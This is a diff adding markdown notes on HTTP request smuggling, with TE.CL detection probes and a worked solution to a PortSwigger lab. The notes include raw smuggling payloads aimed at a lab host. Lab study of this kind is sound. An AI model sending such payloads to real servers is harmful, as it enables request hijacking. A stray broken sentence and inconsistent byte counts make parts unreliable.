@@ -37,4 +37,109 @@ G
 
 If the front-end uses `Content-Length` it will forward the declared number of bytes and include the `G`. The back-end, interpreting the body as chunked, reads the `0\r\n\r\n` sequence (end of chunked body) and then sees `G` as the start of the next request (for example the first byte of the next request line). In other words, `G` becomes the first byte of the next request the back-end processes, which allows an attacker to smuggle bytes into a subsequent request.
 
+
 ## TE.CL detection
+
+This section covers detecting a TE.CL mismatch (the front-end/proxy uses Transfer-Encoding while the back-end uses Content-Length).
+
+1) Confirm the front-end parses chunked encoding
+
+Send a request that is invalid as chunked data and observe whether the front-end rejects it:
+
+```http
+POST / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+Content-Length: 6\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+3\r\n
+abc\r\n
+X\r\n
+```
+
+Expected result: if the front-end is parsing Transfer-Encoding (chunked), it will detect the invalid chunk framing (the `X` is not a valid chunk-size) and return a protocol/parsing error (often a 400). An immediate error here indicates the front-end is handling the request as chunked.
+
+2) Confirm the back-end uses Content-Length (timing-based)
+
+Next, use a request that ends the chunked stream and leaves an extra byte that can be interpreted differently by the back-end:
+
+```http
+POST / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+Content-Length: 6\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+X
+```
+
+Behavior to look for: if the front-end parses Transfer-Encoding, it will forward the chunked stream and any leftover bytes to the back-end. If the back-end instead uses `Content-Length`, it will be expecting the number of bytes declared in `Content-Length` and may wait for more data. This mismatch often causes the back-end to hang or time out while the front-end has already finished — the timing difference is the signal that the back-end is using Content-Length framing.
+
+
+after we have t end the chunked with 
+To solve the lab https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
+
+Goal: craft a chunked request that smuggles a new request starting with "GPOST" so the back-end interprets the next request method as "GPOST" (allowing the smuggle to succeed).
+
+Original request
+```http
+POST / HTTP/1.1\r\n
+Host: 0a730065032a122885236dcb007800cb.web-security-academy.net\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: 0\r\n
+\r\n
+```
+
+Smuggled request (call this SMUGGLED)
+```http
+GPOST / HTTP/1.1\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: XX\r\n
+\r\n
+```
+
+Notes on lengths
+- Because the front-end uses Transfer-Encoding (chunked), we must send the smuggled bytes as chunked data. In the example below the smuggled request body length is 58 bytes (the exact value depends on the bytes you include).
+- After the smuggled bytes we terminate the chunked stream with:
+
+```http
+0\r\n
+\r\n
+```
+
+- The `XX` Content-Length value inside the smuggled request should be set so the back-end will parse the following request correctly. In the example below `XX` is set to the length of the next (normal) request plus one.
+
+Example normal request (the request following the smuggled one)
+```http
+POST / HTTP/1.1\r\n
+Host: 0a730065032a122885236dcb007800cb.web-security-academy.net\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: 8\r\n
+\r\n
+foo=badr
+```
+
+Combined (final) payload example
+```http
+POST / HTTP/1.1\r\n
+Host: 0a730065032a122885236dcb007800cb.web-security-academy.net\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Transfer-Encoding: chunked\r\n
+Content-Length: 4\r\n
+\r\n
+58\r\n
+GPOST / HTTP/1.1\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: 159\r\n
+\r\n
+0\r\n
+\r\n
+```
+
+Explanation (brief)
+- The `Content-Length: 4` in the outer request tells a back-end that honors Content-Length to stop after reading 4 bytes of the body (in this payload those 4 bytes are the ASCII digits `58\r\n`). The chunked framing then delivers the smuggled request bytes (`GPOST ...`) followed by a `0\r\n\r\n` terminator.
+- The `Content-Length: 159` inside the smuggled request is chosen so the back-end will treat the following bytes as the body of that smuggled request (the exact value depends on your smuggled and following request lengths).
+
+Verify carefully: byte counts and CRLFs must be exact — off-by-one errors will make the smuggle fail. If you want, I can compute exact byte lengths for the specific smuggled content you plan to use and update the payload accordingly.
+
